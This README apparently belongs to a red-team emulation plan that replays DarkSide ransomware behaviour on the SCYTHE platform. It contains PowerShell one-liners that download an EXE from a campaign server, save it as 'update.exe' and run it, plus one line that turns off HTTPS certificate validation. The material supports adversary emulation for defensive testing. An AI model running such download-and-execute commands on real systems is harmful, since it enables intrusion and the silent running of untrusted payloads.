# DarkSide Ransomware Adversary Emulation Plan

This threat is based on CyberReason's Cyber Threat Intelligence: https://www.cybereason.com/blog/cybereason-vs-darkside-ransomware

To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/DarkSide/DarkSide_scythe_threat.json
2. Download the Virtual File System (VFS) files under DarkSide/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/DarkSide
4. Ensure HTTP Relay is running on your SCYTHE server.
5. Create a new campaign, selecting HTTP, and ensuring the communication options match your HTTP Relay.
6. Import from Existing Threat: DarkSide
7. Launch Campaign
8. Click More Actions and copy the URL for the desired EXE. 
9. In the target system, run this PowerShell command with the respective URL: powershell -Command "(New-Object Net.WebClient).DownloadFile('<SCYTHE EXE URL>','C:\Users\Public\update.exe')"
10. Execute update.exe

Note, to get around HTTPS certificate validation issues:
Open a PowerShell command prompt
PS C:\Users\LocalUser> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
PS C:\Users\LocalUser> (New-Object Net.WebClient).DownloadFile('<SCYTHE EXE URL>','C:\Users\Public\update.exe')
PS C:\Users\LocalUser> C:\Users\Public\update.exe